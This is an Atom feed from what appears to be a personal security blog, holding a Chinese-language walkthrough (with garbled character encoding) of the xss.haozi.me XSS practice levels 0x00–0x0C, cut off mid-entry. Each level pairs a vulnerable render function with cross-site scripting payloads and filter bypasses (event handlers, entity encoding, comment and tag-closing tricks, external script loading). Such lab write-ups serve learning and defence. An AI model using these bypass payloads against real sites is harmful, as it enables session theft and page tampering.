<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Mi1k7ea</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://Mi1k7ea.github.com/"/>
  <updated>2019-02-16T07:52:52.137Z</updated>
  <id>https://Mi1k7ea.github.com/</id>
  
  <author>
    <name>Mi1k7ea</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>XSSé—¯å…³ä¹‹xss.haozi.me</title>
    <link href="https://Mi1k7ea.github.com/2019/02/15/XSS%E9%97%AF%E5%85%B3%E4%B9%8Bxss-haozi-me/"/>
    <id>https://Mi1k7ea.github.com/2019/02/15/XSSé—¯å…³ä¹‹xss-haozi-me/</id>
    <published>2019-02-15T15:29:40.000Z</published>
    <updated>2019-02-16T07:52:52.137Z</updated>
    
    <content type="html"><![CDATA[<h2 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h2><p>è¿™é‡Œå†™ä¸‹haoziå¤§ä½¬çš„XSSé—¯å…³ç»ƒä¹ ç¬”è®°ã€‚</p><p>é¢˜ç›®ç½‘å€ä¸ºï¼š<a href="https://xss.haozi.me/" target="_blank" rel="noopener">https://xss.haozi.me/</a></p><p>é¡¹ç›®åœ°å€ä¸ºï¼š<a href="https://github.com/haozi/xss-demo" target="_blank" rel="noopener">https://github.com/haozi/xss-demo</a></p><p>æ³¨æ„è¿™é‡Œæœ‰ä¸€ä¸ªè‡ªå¸¦alert(1)çš„jsåœ°å€ï¼š<a href="https://xss.haozi.me/j.js" target="_blank" rel="noopener">https://xss.haozi.me/j.js</a>ã€‚</p><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>å…³é”®æºç ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;div&gt;'</span> + input + <span class="string">'&lt;/div&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ— ä»»ä½•è¿‡æ»¤ç›´æ¥å¾€divæ ‡ç­¾å†…å†™å†…å®¹ï¼Œç›´æ¥ä¸Špayloadå³å¯ã€‚ä¸‹é¢å°†æœ¬æ¬¡ç”¨åˆ°çš„XSS payloadå°ç»“å¦‚ä¸‹ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(1)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>/<span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">image</span> <span class="attr">src</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://xss.haozi.me/j.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>//åŠ è½½å¤–éƒ¨js</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">button</span> <span class="attr">onclick</span>=<span class="string">"alert(1)"</span>&gt;</span>//ç‚¹å‡»æŒ‰é’®</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onmouseover</span>=<span class="string">alert(1)</span>&gt;</span>//é¼ æ ‡æŒ‡é’ˆç§»åŠ¨åˆ°æŒ‡å®šçš„å…ƒç´ ä¸Šæ—¶æ‰§è¡Œ</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onmousemove</span>=<span class="string">alert(1)</span>&gt;</span>//é¼ æ ‡ç§»åŠ¨æ—¶æ‰§è¡Œ</span><br><span class="line">......è¿˜æœ‰å…¶ä»–onmouseç³»åˆ—</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">javascript:</span> <span class="attr">onmouseover</span>=<span class="string">"alert(1)"</span>&gt;</span>//é¼ æ ‡ç§»åŠ¨æŒ‡å‘å›¾ç‰‡</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">javascript:</span> <span class="attr">onclick</span>=<span class="string">"alert(1)"</span>&gt;</span>//é¼ æ ‡ç‚¹å‡»å›¾ç‰‡</span><br></pre></td></tr></table></figure><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>å…³é”®æºç ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;textarea&gt;'</span> + input + <span class="string">'&lt;/textarea&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ— ä»»ä½•è¿‡æ»¤ç›´æ¥å¾€textareaæ ‡ç­¾å†…å†™å†…å®¹ï¼Œç›´æ¥å†™å’Œä¸Šé¢ä¸€æ ·çš„payloadæ˜¯ä¸è¡Œçš„ï¼Œå› ä¸ºè¯¥æ ‡ç­¾å†…è¢«è§£æä¸ºæ–‡æœ¬å†…å®¹ï¼Œæ–‡æœ¬æ¡†æ˜¯æ— æ³•æ‰§è¡ŒJSä»£ç çš„ï¼Œå› æ­¤éœ€è¦é—­åˆè¯¥textareaæ ‡ç­¾ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>å…³é”®æºç ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;input type="name" value="'</span> + input + <span class="string">'"&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç®€å•çš„DOMå‹XSSï¼Œæ— ä»»ä½•è¿‡æ»¤ç›´æ¥å¾€inputæ ‡ç­¾å†…çš„valueå±æ€§å†™å†…å®¹ï¼Œé—­åˆæ‰åŒå¼•å·å’Œå¤§äºå·å³å¯ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">"&gt;<span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥å¦‚ä¸‹æ„é€ ï¼Œå½“é¼ æ ‡æŒ‡å‘inputè¾“å…¥æ¡†æ—¶å°±ä¼šæ‰§è¡Œå¼¹æ¡†ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">" onmouseover="alert(1)</span><br></pre></td></tr></table></figure><h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>å…³é”®æºç ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> stripBracketsRe = <span class="regexp">/[()]/g</span></span><br><span class="line">  input = input.replace(stripBracketsRe, <span class="string">''</span>)</span><br><span class="line">  <span class="keyword">return</span> input</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ­£åˆ™è¿‡æ»¤äº†[]ã€()ç­‰ç¬¦å·ï¼Œé‚£å°±ç”¨åå¼•å·`æ¥æ›¿ä»£()ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert</span>`<span class="attr">1</span>`&gt;</span></span><br></pre></td></tr></table></figure><p>å½“ç„¶åœ¨æ ‡ç­¾å±æ€§å†…ä¹Ÿå¯ä»¥ä½¿ç”¨HTMLå®ä½“ç¼–ç ç»•è¿‡ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">""</span> <span class="attr">onerror</span>=<span class="string">alert&amp;#x28;&amp;#x31;&amp;#x29;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ç›´æ¥å¼•ç”¨å¤–éƒ¨jsæ–‡ä»¶åŒæ ·OKï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://xss.haozi.me/j.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><p>å…³é”®æºç ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> stripBracketsRe = <span class="regexp">/[()`]/g</span></span><br><span class="line">  input = input.replace(stripBracketsRe, <span class="string">''</span>)</span><br><span class="line">  <span class="keyword">return</span> input</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨ä¸Šä¸€é¢˜çš„åŸºç¡€ä¸Šï¼Œæ·»åŠ äº†åå¼•å·`çš„è¿‡æ»¤ï¼Œä½†å‰é¢çš„åä¸¤ä¸ªpayloadæ˜¯å¯ä»¥ç”¨çš„ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">""</span> <span class="attr">onerror</span>=<span class="string">alert&amp;#x28;&amp;#x31;&amp;#x29;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://xss.haozi.me/j.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å½“ç„¶è¿˜æœ‰ä¸‹é¢ä¸€äº›payloadï¼ŒåŒæ ·éƒ½æ˜¯åˆ©ç”¨ç¼–ç ç»•è¿‡ï¼Œåªæ˜¯æ ‡ç­¾ä¸åŒè€Œå·²ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">window</span>.onerror=<span class="built_in">eval</span>;<span class="keyword">throw</span><span class="string">'=alert\x281\x29'</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>//åˆ©ç”¨jsæ•è·æŠ›å‡ºé”™è¯¯æ‰§è¡Œå¼¹æ¡†ï¼ŒUnicodeç¼–ç </span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">srcdoc</span>=<span class="string">"&lt;script&gt;parent.alert&amp;#40;1&amp;#41;&lt;/script&gt;"</span>&gt;</span>//åˆ©ç”¨HTML5ä¸­iframeçš„ç‰¹ç‚¹ï¼Œå…¶srcdocå±æ€§é‡Œçš„ä»£ç ä¼šä½œä¸ºiframeä¸­çš„å†…å®¹æ˜¾ç¤ºå‡ºæ¥ï¼Œsrcdocä¸­å¯ä»¥ç›´æ¥å»å†™è½¬è¯‘åçš„HTMLç‰‡æ®µ</span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert&amp;#40;1&amp;#41</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>//svgæ ‡ç­¾å¯ç›´æ¥æ‰§è¡Œå®ä½“å­—ç¬¦å³HTMLè½¬ä¹‰å­—ç¬¦ï¼Œè‹¥ä¸æ·»åŠ åœ¨å‰åˆ™åŒ…å«è§£æscriptæ ‡ç­¾å†…å®¹çš„ç¼–ç å†…å®¹</span><br></pre></td></tr></table></figure><h2 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h2><p>å…³é”®æºç ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.replace(<span class="regexp">/--&gt;/g</span>, <span class="string">'ğŸ˜‚'</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;!-- '</span> + input + <span class="string">' --&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿‡æ»¤äº†â€“&gt;ï¼Œå¹¶å°†è¾“å…¥æ”¾å…¥æ³¨é‡Šä¸­é—´ã€‚ä½†æ˜¯ï¼Œ</p><p>HTMLæ³¨é‡Šæ”¯æŒä»¥ä¸‹ä¸¤ç§æ–¹å¼ï¼š</p><ul><li><code>&lt;!-- xxx --&gt;</code></li><li><code>&lt;!- xxx -!&gt;</code> <code>&lt;!â€”</code> ä»¥ï¼å¼€å¤´ï¼Œä»¥ï¼ç»“å°¾å¯¹ç§°æ³¨é‡Šçš„æ–¹å¼ <code>â€”!&gt;</code></li></ul><p>ç›´æ¥å¦‚ä¸‹ç»•è¿‡ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--!&gt;<span class="tag">&lt;<span class="name">body</span>/<span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h2><p>å…³é”®æºç ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.replace(<span class="regexp">/auto|on.*=|&gt;/ig</span>, <span class="string">'_'</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;input value=1 <span class="subst">$&#123;input&#125;</span> type="text"&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿‡æ»¤äº†autoã€å¤§äºå·&gt;ã€ä»¥onå¼€å¤´=ç­‰å·ç»“å°¾ï¼Œå°†å…¶æ›¿æ¢æˆ_ï¼Œä¸”å¿½ç•¥å¤§å°å†™ã€‚ä½†æ˜¯æ²¡æœ‰è¿‡æ»¤æ¢è¡Œï¼Œç›´æ¥å¯ä»¥æ¢è¡Œç»•è¿‡ã€‚</p><p>è¿™é‡Œåˆ©ç”¨inputæ ‡ç­¾çš„onmouseç³»åˆ—å±æ€§å¼¹æ¡†å³å¯ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">onmousemove</span><br><span class="line">=alert(1)</span><br></pre></td></tr></table></figure><p>å¦å¤–ï¼Œinputæ ‡ç­¾çš„typeå±æ€§å¯ä»¥è®¾ç½®ä¸ºimageï¼Œç„¶ååˆ©ç”¨ç±»ä¼¼imgæ ‡ç­¾çš„å¥—è·¯æ¥å¼¹æ¡†å³å¯ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">type="image" src="" onerror</span><br><span class="line">=alert(1)</span><br></pre></td></tr></table></figure><h2 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h2><p>å…³é”®æºç ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> stripTagsRe = <span class="regexp">/&lt;\/?[^&gt;]+&gt;/gi</span></span><br><span class="line"></span><br><span class="line">  input = input.replace(stripTagsRe, <span class="string">''</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;article&gt;<span class="subst">$&#123;input&#125;</span>&lt;/article&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ­£åˆ™è¿‡æ»¤äº†&lt;&gt;æ‹¬èµ·æ¥çš„å­—ç¬¦ä¸²å†…å®¹ï¼Œè¿™é‡Œå¯ä»¥åˆ©ç”¨å®¹é”™æ€§ï¼Œå°‘æ·»åŠ æœ€åä¸€ä¸ªå¤§äºå·&gt;ä¹Ÿæ˜¯å¯ä»¥æ‰§è¡Œçš„ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>/<span class="attr">onload</span>=<span class="string">alert(1)//</span></span></span><br></pre></td></tr></table></figure><p>å½“ç„¶ï¼Œâ€//â€œå¯ä»¥æ›¿æ¢ä¸ºâ€&lt;!â€“â€æˆ–ç©ºæ ¼æˆ–å›è½¦ã€‚</p><h2 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h2><p>å…³é”®æºç ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">src</span>) </span>&#123;</span><br><span class="line">  src = src.replace(<span class="regexp">/&lt;\/style&gt;/ig</span>, <span class="string">'/* \u574F\u4EBA */'</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">    &lt;style&gt;</span></span><br><span class="line"><span class="string">      <span class="subst">$&#123;src&#125;</span></span></span><br><span class="line"><span class="string">    &lt;/style&gt;</span></span><br><span class="line"><span class="string">  `</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ­£åˆ™è¿‡æ»¤äº†æƒ³è¦é—­åˆç”¨çš„styleæ ‡ç­¾ï¼Œä¸”å¿½ç•¥å¤§å°å†™ã€‚å’Œå‰é¢çš„ä¸€æ ·ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨æ ‡ç­¾çš„å¤§äºå·&gt;ä¹‹å‰æ·»åŠ ç©ºæ ¼æˆ–æ¢è¡Œæ¥ç»•è¿‡æ‰§è¡Œï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">style</span> &gt;</span><span class="tag">&lt;<span class="name">body</span>/<span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x09"><a href="#0x09" class="headerlink" title="0x09"></a>0x09</h2><p>å…³é”®æºç ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> domainRe = <span class="regexp">/^https?:\/\/www\.segmentfault\.com/</span></span><br><span class="line">  <span class="keyword">if</span> (domainRe.test(input)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`&lt;script src="<span class="subst">$&#123;input&#125;</span>"&gt;&lt;/script&gt;`</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'Invalid URL'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ­£åˆ™é™åˆ¶äº†å¿…é¡»ä»¥æŒ‡å®šçš„åŸŸåæ¥å¼€å¤´ï¼Œå¹¶æ”¾ç½®åœ¨scriptæ ‡ç­¾çš„srcå±æ€§ä¸­ã€‚è¿™é‡Œç›´æ¥é—­åˆåŒå¼•å·å’Œscriptæ ‡ç­¾å³å¯ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://www.segmentfault.com"&gt;<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://xss.haozi.me/j.js</span></span></span><br></pre></td></tr></table></figure><h2 id="0x0A"><a href="#0x0A" class="headerlink" title="0x0A"></a>0x0A</h2><p>å…³é”®æºç ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">escapeHtml</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> s.replace(<span class="regexp">/&amp;/g</span>, <span class="string">'&amp;amp;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/'/g</span>, <span class="string">'&amp;#39;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/"/g</span>, <span class="string">'&amp;quot;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/&lt;/g</span>, <span class="string">'&amp;lt;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/&gt;/g</span>, <span class="string">'&amp;gt;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\//g</span>, <span class="string">'&amp;#x2f'</span>)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> domainRe = <span class="regexp">/^https?:\/\/www\.segmentfault\.com/</span></span><br><span class="line">  <span class="keyword">if</span> (domainRe.test(input)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`&lt;script src="<span class="subst">$&#123;escapeHtml(input)&#125;</span>"&gt;&lt;/script&gt;`</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'Invalid URL'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨ä¸Šä¸€é¢˜çš„åŸºç¡€ä¸Šï¼Œè¿‡æ»¤äº†&amp;ã€â€™ã€â€ã€&lt;&gt;ã€/ç­‰å­—ç¬¦ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä¸èƒ½é€šè¿‡é—­åˆçš„å½¢å¼æ„é€ payloadæ‰§è¡Œäº†ã€‚</p><p>è¿™é‡Œå¯ä»¥åˆ©ç”¨URLçš„@å­—ç¬¦çš„ç‰¹æ€§æ¥è°ƒç”¨å¤–éƒ¨j.jsã€‚</p><p>ä¸€èˆ¬çš„ï¼Œå½“æˆ‘ä»¬è®¿é—®<a href="http://a.com@b.com" target="_blank" rel="noopener">http://a.com@b.com</a></p><p>å®é™…æ˜¯è®¿é—®<a href="http://b.com" target="_blank" rel="noopener">http://b.com</a></p><p>è™½ç„¶URLä¸­çš„ç‰¹æ®Šç¬¦å·ä¼šè¢«è¿‡æ»¤ï¼Œä½†è¿‡æ»¤åçš„HTMLå®ä½“ç¼–ç åœ¨HTMLæ ‡ç­¾å±æ€§å€¼ä¸­æ— å½±å“ï¼Œå¯ä»¥ç›´æ¥è§£ææ‰§è¡Œï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.segmentfault.com@xss.haozi.me/j.js</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯æˆ‘è¿™é‡Œæ˜¯æ²¡æœ‰æˆåŠŸæ‰§è¡Œçš„ï¼ŒåŸå› å¾…ç¡®å®šã€‚</p><h2 id="0x0B"><a href="#0x0B" class="headerlink" title="0x0B"></a>0x0B</h2><p>å…³é”®æºç ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.toUpperCase()</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;h1&gt;<span class="subst">$&#123;input&#125;</span>&lt;/h1&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å°†è¾“å…¥çš„å­—æ¯å…¨éƒ¨è½¬æ¢æˆå¤§å†™å½¢å¼å°±ç›´æ¥ä¼ å…¥h1æ ‡ç­¾ä¸­ã€‚</p><p>æœ‰å‡ ä¸ªtipsï¼š</p><ul><li>htmlæ ‡ç­¾å¤§å°å†™æ— å½±å“ï¼›</li><li>jsä¸¥æ ¼åŒºåˆ†å¤§å°å†™ã€‚</li></ul><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œä¸èƒ½ç›´æ¥æ„é€ jsä»£ç æ‰§è¡Œäº†ï¼Œä½†è¿™é‡Œå¯ä»¥åˆ©ç”¨scriptæ ‡ç­¾åŠ è½½j.jsï¼Œå› ä¸ºURLåœ°å€ä¸å—å¤§å°å†™å½±å“ä¸”HTMLæ ‡ç­¾ä¸å—å¤§å°å†™å½±å“ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://xss.haozi.me/j.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x0C"><a href="#0x0C" class="headerlink" title="0x0C"></a>0x0C</h2><p>å…³é”®æºç ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.replace(<span class="regexp">/script/ig</span>, <span class="string">''</span>)</span><br><span class="line">  input = input.toUpperCase()</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;h1&gt;'</span> + input + <span class="string">'&lt;/h1&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨ä¸Šä¸€é¢˜çš„åŸºç¡€ä¸Šï¼Œæ›¿æ¢äº†scriptå­—ç¬¦ä¸²ä¸ºç©ºï¼Œä¸”å¿½ç•¥å¤§å°å†™ã€‚</p><p>æˆ‘ä»¬å¯ä»¥å†…åµŒscriptæ¥ç»•è¿‡ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 